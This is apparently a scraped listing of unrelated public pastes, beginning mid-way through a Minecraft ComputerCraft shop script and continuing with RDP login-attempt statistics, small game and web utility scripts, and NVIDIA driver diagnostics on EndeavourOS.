        file.close()















    else















        -- Open the file in write mode with count for the first occurrence















        file = fs.open(filePath, ""w"")















        if file then















            file.writeLine(displayName .. "","" .. itemName .. "","" .. count)















            file.close()















        else















            print(""Error: Unable to open file "" .. filePath)















        end















    end















end































-- Function to handle successful money transaction















local function Money_Success(username, cost, balances)















    print(""Transaction successful for "" .. username .. "". Cost: "" .. cost)















    balances[username] = balances[username] - cost















    saveBalances(balances)































    local DisplayName, ItemName = getItemDetails()































    -- Assuming 'cost.txt' contains individual count and price lines















    local costPath = ""cost.txt""















    local costFile = fs.open(costPath, ""r"")































    if costFile then















        local countLine = costFile.readLine()















        local priceLine = costFile.readLine()































        local count = tonumber(countLine:match(""Count = (%d+)""))















        local price = tonumber(priceLine:match(""Price = (%d+)""))































        if count and price then















            local cost = price  -- Cost per item, not total cost















            savePlayerItems(username, DisplayName, ItemName, count)  -- Pass the count as the fourth parameter















        else















            print(""Error: Unable to read count and price from "" .. costPath)















        end































        costFile.close()















    else















        print(""Error: Unable to open file "" .. costPath)















    end































    -- Add your code for a successful transaction here















end































-- Function to handle failed money transaction















local function Money_Fail(username, cost, currentBalance)















    print(""Transaction failed for "" .. username .. "". Insufficient funds. Cost: "" .. cost)















    print(""Current Balance for "" .. username .. "": "" .. currentBalance)















    -- Add your code for a failed transaction here















end































-- Function to compare the balance and perform actions accordingly















local function checkBalance(username, cost)















    local balances = loadBalances()































    if balances[username] then















        local playerBalance = balances[username]































        if playerBalance >= cost then















            Money_Success(username, cost, balances)















        else















            Money_Fail(username, cost, playerBalance)















        end















    else















        Money_Fail(username, cost, 0)  -- Assuming initial balance is 0















    end















end



















-- Function to update the global database



local function updateGlobalDatabase(DisplayName, Price, Count, TurtleID)



    local path = ""disk/GlobalDatabase.txt""



    local file







    -- Extract the item name without the ""minecraft:"" prefix



    local itemName = DisplayName:gsub(""minecraft:"", """")







    if fs.exists(path) then



        file = fs.open(path, ""r"")



        local content = file.readAll()



        file.close()







        -- Parse existing content to find and update the line for the current TurtleID



        local lines = {}



        local foundTurtleID = false







        for line in content:gmatch(""[^\r\n]+"") do



            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")







            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then



                if tonumber(turtleIDExisting) == TurtleID then



                    foundTurtleID = true



                    line = itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID



                end



                table.insert(lines, line)



            end



        end







        -- If the TurtleID was not found, append a new line



        if not foundTurtleID then



            table.insert(lines, itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)



        end







        file = fs.open(path, ""w"")



        for _, line in ipairs(lines) do



            file.writeLine(line)



        end



        file.close()



    else



        -- Create the file and add a new line for the current TurtleID



        file = fs.open(path, ""w"")



        if file then



            file.writeLine(itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)



            file.close()



        else



            print(""Error: Unable to open file "" .. path)



        end



    end



end

















-- Function to update cost.txt with values associated with TurtleID

local function updateCostFile(TurtleID)

    local turtleCostsPath = ""cost.txt""

    local globalDatabasePath = ""disk/GlobalDatabase.txt""

    local file



    local foundTurtleID = false

    local count, price



    -- Check if TurtleID is in globaldatabase.txt

    if fs.exists(globalDatabasePath) then

        file = fs.open(globalDatabasePath, ""r"")

        local content = file.readAll()

        file.close()



        -- Check if TurtleID entry exists in globaldatabase.txt

        if content:match(TurtleID) then

            -- Extract values for the TurtleID from globaldatabase.txt

            local itemName, priceExisting, countExisting = content:match(""([^|]+)|([^|]+)|([^|]+)|"" .. TurtleID)



            if itemName and priceExisting and countExisting then

                foundTurtleID = true

                price = tonumber(priceExisting)

                count = tonumber(countExisting)

            end

        end

    else

        print(""Error: Unable to open file "" .. globalDatabasePath)

        return

    end



    -- Set values in cost.txt based on globaldatabase.txt

    if foundTurtleID then

        file = fs.open(turtleCostsPath, ""w"")

        file.writeLine(""Count = "" .. count)

        file.writeLine(""Price = "" .. price)

        file.close()

       --#IGNORE print(""Updated cost.txt with values from GlobalDatabase.txt for TurtleID "" .. TurtleID)

    else

        -- Add a new entry for the TurtleID with values from cost.txt to globaldatabase.txt

        if fs.exists(turtleCostsPath) then

            file = fs.open(turtleCostsPath, ""r"")

            local countLine = file.readLine()

            local priceLine = file.readLine()

            file.close()



            local itemName = DisplayName  -- Use the actual item display name

            file = fs.open(globalDatabasePath, ""a"")

            file.writeLine(itemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)

            file.close()

            print(""Added new entry for TurtleID "" .. TurtleID .. "" in GlobalDatabase.txt with values from cost.txt"")

        else

            print(""Error: Unable to open file "" .. turtleCostsPath)

        end

    end

end



































-- Main loop to constantly check for player clicks







local prevItemName = nil  -- Variable to store the previous item name







while true do



	-- Check for inactivity and restart if needed



    event, username, device = os.pullEvent(""playerClick"")







    -- Get item details when a player clicks



    local DisplayName, ItemName = getItemDetails()







    -- Check if item details are available



    if DisplayName and ItemName then



        local TurtleID = os.getComputerID()











        -- Update cost.txt with values associated with the TurtleID



        updateCostFile(TurtleID)







        -- Check if the item in front has changed



        if prevItemName ~= ItemName then



            prevItemName = ItemName







            -- Assuming 'cost.txt' contains individual count and price lines



            local costPath = ""cost.txt""



            local costFile = fs.open(costPath, ""r"")







            if costFile then



                local countLine = costFile.readLine()



                local priceLine = costFile.readLine()







                if countLine and priceLine then



                    local count = tonumber(countLine:match(""Count = (%d+)""))



                    local price = tonumber(priceLine:match(""Price = (%d+)""))







                    if count and price then



                        local cost = price  -- Cost per item, not total cost



                        checkBalance(username, cost)







                        -- Remove ""minecraft:"" from ItemName



                        local formattedItemName = ItemName:gsub(""minecraft:"", """")







                        -- Update the item name in globalDatabase.txt



                        local globalDatabasePath = ""disk/GlobalDatabase.txt""



                        local globalFile = fs.open(globalDatabasePath, ""r"")



                        local globalContent = globalFile.readAll()



                        globalFile.close()







                        local lines = {}







                        for line in globalContent:gmatch(""[^\r\n]+"") do



                            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")







                            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then



                                if tonumber(turtleIDExisting) == TurtleID then



                                    -- Update the item name



                                    line = formattedItemName .. ""|"" .. priceExisting .. ""|"" .. countExisting .. ""|"" .. turtleIDExisting



                                end



                            end







                            table.insert(lines, line)



                        end







                        globalFile = fs.open(globalDatabasePath, ""w"")



                        for _, line in ipairs(lines) do



                            globalFile.writeLine(line)



                        end



                        globalFile.close()







                        -- Add any additional code specific to your application







                    else



                        print(""Error: Unable to read count and price from "" .. costPath)



                    end







                else



                    print(""Error: Missing lines in "" .. costPath)



                end







                costFile.close()







                -- Reset prevItemName to nil after a successful transaction



                prevItemName = nil



            else



                print(""Error: Unable to open file "" .. costPath)



            end



        else



            print(""Item in front has not changed. Skipping update."")



        end



    end



end

"
9KZx45HD,Pastes.io - #1 [Pastebin Alternative],xxsa,PHP,Sunday 10th of March 2024 09:06:09 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Report explicit pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
User profile page
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense ( Few rather than Pastebin )"
QiVGGTSz,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:18:18 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 6,
    ""194.165.16.11"": 6,
    ""167.94.146.53"": 3,
    ""45.33.87.154"": 3,
    ""80.66.76.92"": 9,
    ""80.66.88.211"": 3,
    ""205.210.31.216"": 9,
    ""87.251.75.145"": 12,
    ""45.227.254.9"": 12,
    ""185.170.144.113"": 18,
    ""185.170.144.3"": 6,
    ""167.94.145.57"": 3,
    ""187.191.116.227"": 3,
    ""171.244.142.194"": 9,
    ""205.210.31.175"": 9,
    ""46.19.143.42"": 3,
    ""36.91.222.100"": 6,
    ""27.71.25.157"": 6,
    ""135.181.246.108"": 3,
    ""181.30.39.44"": 3,
    ""71.6.199.23"": 3,
    ""171.244.39.188"": 3,
    ""222.186.13.132"": 6,
    ""152.32.245.44"": 3,
    ""45.227.254.49"": 6,
    ""205.210.31.232"": 9,
    ""45.227.254.55"": 6,
    ""103.240.6.155"": 12,
    ""87.251.75.64"": 3,
    ""218.148.169.168"": 3,
    ""205.210.31.202"": 9
  },
  ""asn"": {
    ""AS48721"": 12,
    ""AS398705"": 6,
    ""AS63949"": 3,
    ""AS208091"": 27,
    ""AS396982"": 36,
    ""AS267784"": 24,
    ""AS197414"": 24,
    ""AS262545"": 3,
    ""AS38731"": 18,
    ""AS51852"": 3,
    ""AS7713"": 6,
    ""AS24940"": 3,
    ""AS7303"": 3,
    ""AS10439"": 3,
    ""AS4134"": 6,
    ""AS135377"": 3,
    ""AS151853"": 12,
    ""AS4766"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 36,
    ""Censys, Inc."": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Xhost Internet Solutions LP"": 48,
    ""Xhost Internet Solutions"": 3,
    ""Google LLC"": 36,
    ""Mandic S.A."": 3,
    ""VIETEL"": 12,
    ""Private Layer INC"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""VIETTEL"": 6,
    ""Hetzner Online GmbH"": 3,
    ""Telecom Argentina S.A"": 3,
    ""CariNet, Inc."": 3,
    ""Chinanet"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Giza Network Limited"": 12,
    ""Korea Telecom"": 3
  },
  ""org"": {
    ""Flyservers S.A"": 12,
    ""Censys, Inc."": 6,
    ""Linode"": 3,
    ""Xhost Internet Solutions"": 24,
    ""XHOSTIS"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 24,
    ""Xhostis"": 24,
    ""Mandic S.A"": 3,
    ""Viettel Corporation"": 12,
    ""Client1096"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Viettel Group"": 6,
    ""Hetzner Online GmbH"": 3,
    ""Fibertel"": 3,
    ""CariNet, Inc."": 3,
    ""Chinanet JS"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Giza Network Limited"": 12,
    ""Korea Telecom"": 3
  },
  ""regionName"": {
    ""Kaunas"": 12,
    ""Hesse"": 6,
    ""New Jersey"": 3,
    ""North Holland"": 48,
    ""Drenthe"": 3,
    ""California"": 39,
    ""Vilnius"": 24,
    ""Sao Paulo"": 3,
    ""Hanoi"": 18,
    ""Zurich"": 3,
    ""Jakarta"": 6,
    ""Uusimaa"": 3,
    ""Buenos Aires F.D."": 3,
    ""Jiangsu"": 6,
    ""Bangkok"": 3,
    ""Ho Chi Minh"": 12,
    ""Gyeonggi-do"": 3
  },
  ""country"": {
    ""Lithuania"": 36,
    ""Germany"": 6,
    ""United States"": 42,
    ""The Netherlands"": 51,
    ""Brazil"": 3,
    ""Vietnam"": 30,
    ""Switzerland"": 3,
    ""Indonesia"": 6,
    ""Finland"": 3,
    ""Argentina"": 3,
    ""China"": 6,
    ""Thailand"": 3,
    ""South Korea"": 3
  },
  ""account"": {
    ""Test"": 30,
    ""(empty)"": 12,
    ""Administr"": 39,
    ""msdIEiXrR"": 3,
    ""llWZNp"": 3,
    ""ZkQrLF"": 3,
    ""Domain"": 27,
    ""hello"": 39,
    ""POTDznWpm"": 3,
    ""BXtdnc"": 3,
    ""sAiKYR"": 3,
    ""root"": 3,
    ""nmap"": 6,
    ""Administrator"": 3,
    ""zEQglHzNl"": 3,
    ""mIEquM"": 3,
    ""uknIhH"": 3,
    ""nMgimtNZL"": 3,
    ""QtYhiV"": 3,
    ""kwEXql"": 3
  },
  ""keyboard"": {
    ""Unknown"": 195
  },
  ""client_build"": {
    ""Unknown"": 195
  },
  ""client_name"": {
    ""Unknown"": 195
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""hosting"": 66,
    ""mobile & hosting"": 6,
    ""proxy"": 6
  }
}"
q801ZSnt,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:16:07 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 4,
    ""194.165.16.11"": 4,
    ""167.94.146.53"": 2,
    ""45.33.87.154"": 2,
    ""80.66.76.92"": 6,
    ""80.66.88.211"": 2,
    ""205.210.31.216"": 6,
    ""87.251.75.145"": 8,
    ""45.227.254.9"": 8,
    ""185.170.144.113"": 12,
    ""185.170.144.3"": 4,
    ""167.94.145.57"": 2,
    ""187.191.116.227"": 2,
    ""171.244.142.194"": 6,
    ""205.210.31.175"": 6,
    ""46.19.143.42"": 2,
    ""36.91.222.100"": 4,
    ""27.71.25.157"": 4,
    ""135.181.246.108"": 2,
    ""181.30.39.44"": 2,
    ""71.6.199.23"": 2,
    ""171.244.39.188"": 2,
    ""222.186.13.132"": 4,
    ""152.32.245.44"": 2,
    ""45.227.254.49"": 4,
    ""205.210.31.232"": 6,
    ""45.227.254.55"": 4,
    ""103.240.6.155"": 8,
    ""87.251.75.64"": 2,
    ""218.148.169.168"": 2,
    ""205.210.31.202"": 6
  },
  ""asn"": {
    ""AS48721"": 8,
    ""AS398705"": 4,
    ""AS63949"": 2,
    ""AS208091"": 18,
    ""AS396982"": 24,
    ""AS267784"": 16,
    ""AS197414"": 16,
    ""AS262545"": 2,
    ""AS38731"": 12,
    ""AS51852"": 2,
    ""AS7713"": 4,
    ""AS24940"": 2,
    ""AS7303"": 2,
    ""AS10439"": 2,
    ""AS4134"": 4,
    ""AS135377"": 2,
    ""AS151853"": 8,
    ""AS4766"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 24,
    ""Censys, Inc."": 4,
    ""Akamai Technologies, Inc."": 2,
    ""Xhost Internet Solutions LP"": 32,
    ""Xhost Internet Solutions"": 2,
    ""Google LLC"": 24,
    ""Mandic S.A."": 2,
    ""VIETEL"": 8,
    ""Private Layer INC"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""VIETTEL"": 4,
    ""Hetzner Online GmbH"": 2,
    ""Telecom Argentina S.A"": 2,
    ""CariNet, Inc."": 2,
    ""Chinanet"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Giza Network Limited"": 8,
    ""Korea Telecom"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 8,
    ""Censys, Inc."": 4,
    ""Linode"": 2,
    ""Xhost Internet Solutions"": 16,
    ""XHOSTIS"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 16,
    ""Xhostis"": 16,
    ""Mandic S.A"": 2,
    ""Viettel Corporation"": 8,
    ""Client1096"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Viettel Group"": 4,
    ""Hetzner Online GmbH"": 2,
    ""Fibertel"": 2,
    ""CariNet, Inc."": 2,
    ""Chinanet JS"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Giza Network Limited"": 8,
    ""Korea Telecom"": 2
  },
  ""regionName"": {
    ""Kaunas"": 8,
    ""Hesse"": 4,
    ""New Jersey"": 2,
    ""North Holland"": 32,
    ""Drenthe"": 2,
    ""California"": 26,
    ""Vilnius"": 16,
    ""Sao Paulo"": 2,
    ""Hanoi"": 12,
    ""Zurich"": 2,
    ""Jakarta"": 4,
    ""Uusimaa"": 2,
    ""Buenos Aires F.D."": 2,
    ""Jiangsu"": 4,
    ""Bangkok"": 2,
    ""Ho Chi Minh"": 8,
    ""Gyeonggi-do"": 2
  },
  ""country"": {
    ""Lithuania"": 24,
    ""Germany"": 4,
    ""United States"": 28,
    ""The Netherlands"": 34,
    ""Brazil"": 2,
    ""Vietnam"": 20,
    ""Switzerland"": 2,
    ""Indonesia"": 4,
    ""Finland"": 2,
    ""Argentina"": 2,
    ""China"": 4,
    ""Thailand"": 2,
    ""South Korea"": 2
  },
  ""account"": {
    ""Test"": 20,
    ""(empty)"": 8,
    ""Administr"": 26,
    ""msdIEiXrR"": 2,
    ""llWZNp"": 2,
    ""ZkQrLF"": 2,
    ""Domain"": 18,
    ""hello"": 26,
    ""POTDznWpm"": 2,
    ""BXtdnc"": 2,
    ""sAiKYR"": 2,
    ""root"": 2,
    ""nmap"": 4,
    ""Administrator"": 2,
    ""zEQglHzNl"": 2,
    ""mIEquM"": 2,
    ""uknIhH"": 2,
    ""nMgimtNZL"": 2,
    ""QtYhiV"": 2,
    ""kwEXql"": 2
  },
  ""keyboard"": {
    ""Unknown"": 130
  },
  ""client_build"": {
    ""Unknown"": 130
  },
  ""client_name"": {
    ""Unknown"": 130
  },
  ""ip_type"": {
    ""Unknown"": 78,
    ""hosting"": 44,
    ""mobile & hosting"": 4,
    ""proxy"": 4
  }
}"
U09Ddifq,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 2,
    ""194.165.16.11"": 2,
    ""167.94.146.53"": 1,
    ""45.33.87.154"": 1,
    ""80.66.76.92"": 3,
    ""80.66.88.211"": 1,
    ""205.210.31.216"": 3,
    ""87.251.75.145"": 4,
    ""45.227.254.9"": 4,
    ""185.170.144.113"": 6,
    ""185.170.144.3"": 2,
    ""167.94.145.57"": 1,
    ""187.191.116.227"": 1,
    ""171.244.142.194"": 3,
    ""205.210.31.175"": 3,
    ""46.19.143.42"": 1,
    ""36.91.222.100"": 2,
    ""27.71.25.157"": 2,
    ""135.181.246.108"": 1,
    ""181.30.39.44"": 1,
    ""71.6.199.23"": 1,
    ""171.244.39.188"": 1,
    ""222.186.13.132"": 2,
    ""152.32.245.44"": 1,
    ""45.227.254.49"": 2,
    ""205.210.31.232"": 3,
    ""45.227.254.55"": 2,
    ""103.240.6.155"": 4,
    ""87.251.75.64"": 1,
    ""218.148.169.168"": 1,
    ""205.210.31.202"": 3
  },
  ""asn"": {
    ""AS48721"": 4,
    ""AS398705"": 2,
    ""AS63949"": 1,
    ""AS208091"": 9,
    ""AS396982"": 12,
    ""AS267784"": 8,
    ""AS197414"": 8,
    ""AS262545"": 1,
    ""AS38731"": 6,
    ""AS51852"": 1,
    ""AS7713"": 2,
    ""AS24940"": 1,
    ""AS7303"": 1,
    ""AS10439"": 1,
    ""AS4134"": 2,
    ""AS135377"": 1,
    ""AS151853"": 4,
    ""AS4766"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 2,
    ""Akamai Technologies, Inc."": 1,
    ""Xhost Internet Solutions LP"": 16,
    ""Xhost Internet Solutions"": 1,
    ""Google LLC"": 12,
    ""Mandic S.A."": 1,
    ""VIETEL"": 4,
    ""Private Layer INC"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""VIETTEL"": 2,
    ""Hetzner Online GmbH"": 1,
    ""Telecom Argentina S.A"": 1,
    ""CariNet, Inc."": 1,
    ""Chinanet"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Giza Network Limited"": 4,
    ""Korea Telecom"": 1
  },
  ""org"": {
    ""Flyservers S.A"": 4,
    ""Censys, Inc."": 2,
    ""Linode"": 1,
    ""Xhost Internet Solutions"": 8,
    ""XHOSTIS"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 8,
    ""Xhostis"": 8,
    ""Mandic S.A"": 1,
    ""Viettel Corporation"": 4,
    ""Client1096"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Viettel Group"": 2,
    ""Hetzner Online GmbH"": 1,
    ""Fibertel"": 1,
    ""CariNet, Inc."": 1,
    ""Chinanet JS"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Giza Network Limited"": 4,
    ""Korea Telecom"": 1
  },
  ""regionName"": {
    ""Kaunas"": 4,
    ""Hesse"": 2,
    ""New Jersey"": 1,
    ""North Holland"": 16,
    ""Drenthe"": 1,
    ""California"": 13,
    ""Vilnius"": 8,
    ""Sao Paulo"": 1,
    ""Hanoi"": 6,
    ""Zurich"": 1,
    ""Jakarta"": 2,
    ""Uusimaa"": 1,
    ""Buenos Aires F.D."": 1,
    ""Jiangsu"": 2,
    ""Bangkok"": 1,
    ""Ho Chi Minh"": 4,
    ""Gyeonggi-do"": 1
  },
  ""country"": {
    ""Lithuania"": 12,
    ""Germany"": 2,
    ""United States"": 14,
    ""The Netherlands"": 17,
    ""Brazil"": 1,
    ""Vietnam"": 10,
    ""Switzerland"": 1,
    ""Indonesia"": 2,
    ""Finland"": 1,
    ""Argentina"": 1,
    ""China"": 2,
    ""Thailand"": 1,
    ""South Korea"": 1
  },
  ""account"": {
    ""Test"": 10,
    ""(empty)"": 4,
    ""Administr"": 13,
    ""msdIEiXrR"": 1,
    ""llWZNp"": 1,
    ""ZkQrLF"": 1,
    ""Domain"": 9,
    ""hello"": 13,
    ""POTDznWpm"": 1,
    ""BXtdnc"": 1,
    ""sAiKYR"": 1,
    ""root"": 1,
    ""nmap"": 2,
    ""Administrator"": 1,
    ""zEQglHzNl"": 1,
    ""mIEquM"": 1,
    ""uknIhH"": 1,
    ""nMgimtNZL"": 1,
    ""QtYhiV"": 1,
    ""kwEXql"": 1
  },
  ""keyboard"": {
    ""Unknown"": 65
  },
  ""client_build"": {
    ""Unknown"": 65
  },
  ""client_name"": {
    ""Unknown"": 65
  },
  ""ip_type"": {
    ""Unknown"": 39,
    ""hosting"": 22,
    ""mobile & hosting"": 2,
    ""proxy"": 2
  }
}"
78bPCCFT,The Bro Codes v1,cilerba,Ruby,Sunday 10th of March 2024 07:11:56 PM CDT,"# ==========================================
# The Bro Codes v1
# ==========================================

# Outputs the highest variable index of arguments 1-X in argument 0

# Usage:
# pbHighestVar(var_out, vars...)

def pbHighestVar(*args)
  # Store first variable argument before removing from Array
  out_var = args[0]
  args.delete_at(0)
  
  val = 0
  i = 0
  matches = []
  
  args.each do |var|
    if $game_variables[var] > val
      matches = [i]
      val = $game_variables[var]
    elsif $game_variables[var] == val
      matches.push(i)
    end
    i += 1
  end
  
  $game_variables[out_var] = args[matches[rand(matches.length)]]
end

def pbMapLoop(x_offset)
  $game_player.moveto($game_player.x + x_offset, $game_player.y)
  $game_map.update
  Graphics.frame_reset
  Input.update
end"
AjFvFxmT,Untitled,K7413d,JavaScript,Sunday 10th of March 2024 06:33:45 PM CDT,"let ASCII = {
    // for numbers between 0 and 9
    1: function () {
        return (Math.floor(Math.random() * 10)) + 48; //return numbers between 48 to 57
    },
    // for all capital characters
    2: function () {
        return (Math.floor(Math.random() * 26)) + 65; //return numbers between 64 to 90
    },
    // for all small characters
    3: function () {
        return (Math.floor(Math.random() * 26) + 97); //return numbers between 97 to 122
    },
    //for all special characters %,$,#,&,*,+,?,@
    4: function () {
        let arr = [35, 36, 37, 38, 42, 43, 63, 64]
        return arr[Math.floor(Math.random() * arr.length)]; //return special characters #, &, %, $
    }
}



//get values of checkboxes
let upper = document.getElementById(""upper"");
let lower = document.getElementById(""lower"");
let sym = document.getElementById(""sym"");
let num = document.getElementById(""num"");
let chgLock = true; //change the lock to green if the password generated




function randPass() {
    let valid = [];
    let res = """";

    let checks = {
        1: num.checked,
        2: upper.checked,
        3: lower.checked,
        4: sym.checked,
    };

    for (let i = 1; i < 5; i++) {
        if (checks[i] === true) {
            valid.push(i);
        }
    }

    if (valid.length == 0) {
        res = ""Choose setting first"";
        chgLock = false
    } else {
        chgLock = true;
        let option_number = valid.length;
        let i = 0;
        while (i < rng.value) {
            res += String.fromCharCode(ASCII[valid[Math.floor(Math.random() * option_number)]]());
            i++;
        }

        i = 0;
    }
    return res;

}




// generate pass button and change color of lock
let generate = document.getElementById(""generate_click""); // button for generate password
let lock = document.querySelector("".container .pass i::before"");
let generate_section = document.getElementById(""generated_pass""); //generated pass section



generate.addEventListener('click', function () {

    //set res to the input
    generate_section.value = randPass();


    //change color of lock to green

    // Get the root element
    const rootElement = document.documentElement;

    if (generate_section.value != '' && chgLock) {
        // Set the value of the --primary-color variable to 'green'
        rootElement.style.setProperty('--primary-color', 'green');
    } else {
        // Set the value of the --primary-color variable to 'blue'
        rootElement.style.setProperty('--primary-color', '#0c54fc');
    }


});



// change the number in box
let rng = document.getElementById(""rng"");
var rng_box = document.getElementById(""rng_box"");


rng_box.innerHTML = rng.value;

rng.oninput = function () {
    rng_box.innerHTML = this.value;
}




// change copy icon

let icn = document.getElementById(""cp_icon""); // current icon
let gnPass = document.getElementById(""generated_pass""); // generated password field

icn.onclick = function () {
    const originalIcon = this.innerHTML; // Store original icon

    if (originalIcon != '<i class=""fa-solid fa-check fa-xl""></i>') {
        //copy text to clipboard
        navigator.clipboard.writeText(gnPass.value)

        // Change icon and set a timer to revert after 2 seconds
        this.innerHTML = '<i class=""fa-solid fa-check fa-xl""></i>'

        setTimeout(() => {
            this.innerHTML = originalIcon; // Revert to original icon
        }, 1000);
    }
}



"
6dUFnrGs,Untitled,AdamMathieson,Lua,Sunday 10th of March 2024 06:21:23 PM CDT,"-- Function to calculate hash of a string
local function calculateHash(str)
  local hash = 0
  for i = 1, #str do
    hash = hash + string.byte(str, i)
  end
  return hash
end

-- Function to get color based on hash value
local function getColor(hash)
  local colorsList = {
    colors.white,
    colors.orange,
    colors.magenta,
    colors.lightBlue,
    colors.yellow,
    colors.lime,
    colors.pink,
    colors.gray,
    colors.lightGray,
    colors.cyan,
    colors.purple,
    colors.blue,
    colors.brown,
    colors.green,
    colors.red
  }
  return colorsList[hash % #colorsList + 1]
end

-- Function to list all network devices
local function listNetworkDevices()
  local devices = peripheral.getNames()

  -- Table to store device types and their counts
  local deviceTypes = {}

  -- Function to get the type of a peripheral
  local function getType(peripheralName)
    if peripheral.isPresent(peripheralName) then
      return peripheral.getType(peripheralName)
    else
      return ""Unknown""
    end
  end

  -- Iterate through all connected peripherals
  for _, deviceName in ipairs(devices) do
    local deviceType = getType(deviceName)

    -- Update the count of this device type
    if deviceTypes[deviceType] == nil then
      deviceTypes[deviceType] = 1
    else
      deviceTypes[deviceType] = deviceTypes[deviceType] + 1
    end
  end

  -- Create a list of device types sorted by the number of items
  local sortedTypes = {}
  for deviceType, count in pairs(deviceTypes) do
    table.insert(sortedTypes, {type = deviceType, count = count})
  end
  table.sort(sortedTypes, function(a, b) return a.count > b.count end)

  -- Print the summary with color coding
  print(""Summary of network devices:"")
  for _, device in ipairs(sortedTypes) do
    local deviceType = device.type
    local count = device.count
    local hash = calculateHash(deviceType)
    local color = getColor(hash)
    term.setTextColor(color)
    print(deviceType .. "": "" .. count)
  end
  term.setTextColor(colors.white) -- Reset text color
end

-- Call the function to list network devices
listNetworkDevices()
"
wqshDftL,nVidia with XWayland on EndeavourOS,edmundlaugasson,Bash,Sunday 10th of March 2024 05:37:02 PM CDT,"cat /usr/lib/endeavouros-release
VERSION=2024.01.25

lsb_release -a
Distributor ID: EndeavourOS
Description:    EndeavourOS Linux

# clean online install on March 10, 2024 with KDE desktop

# https://discovery.endeavouros.com/nvidia/new-nvidia-driver-installer-nvidia-inst/2022/03/ 

nvidia-inst --drivers 
NVIDIA card id: 13b0
Fetching driver data from nvidia.com ...
Series 550: supported (nvidia.com: 550.54.14)

nvidia-inst --series 550 -t
2024-03-11 00:11:38: Info: Running: nvidia-inst v23.1-1
2024-03-11 00:11:38: Info: Command line: nvidia-inst --series 550 -t
2024-03-11 00:11:38: Info: Selected mode: nvidia
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COMMANDS TO RUN:
    ==> Looks like all requested packages and settings are already OK!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

inxi -xxxGz
Graphics:
  Device-1: NVIDIA GM107GLM [Quadro M2000M] vendor: Lenovo driver: nvidia
    v: 550.54.14 arch: Maxwell pcie: speed: 5 GT/s lanes: 16 ports: active: none
    off: eDP-1 empty: DP-1,DP-2,DP-3 bus-ID: 01:00.0 chip-ID: 10de:13b0
    class-ID: 0300
  Device-2: Lite-On Integrated Camera driver: uvcvideo type: USB rev: 2.0
    speed: 480 Mb/s lanes: 1 bus-ID: 1-8:2 chip-ID: 04ca:7058 class-ID: 0e02
  Display: wayland server: X.org v: 1.21.1.11 with: Xwayland v: 23.2.4
    compositor: kwin_wayland driver: X: loaded: nvidia unloaded: modesetting
    alternate: fbdev,nouveau,nv,vesa gpu: nvidia display-ID: 0
  Monitor-1: eDP-1 res: 1536x864 size: N/A modes: N/A
  API: EGL v: 1.5 hw: drv: nvidia platforms: device: 0 drv: nvidia device: 2
    drv: swrast gbm: drv: nvidia surfaceless: drv: nvidia wayland: drv: nvidia
    x11: drv: zink inactive: device-1
  API: OpenGL v: 4.6.0 compat-v: 4.5 vendor: nvidia mesa v: 550.54.14
    glx-v: 1.4 direct-render: yes renderer: Quadro M2000M/PCIe/SSE2
    display-ID: :1.0
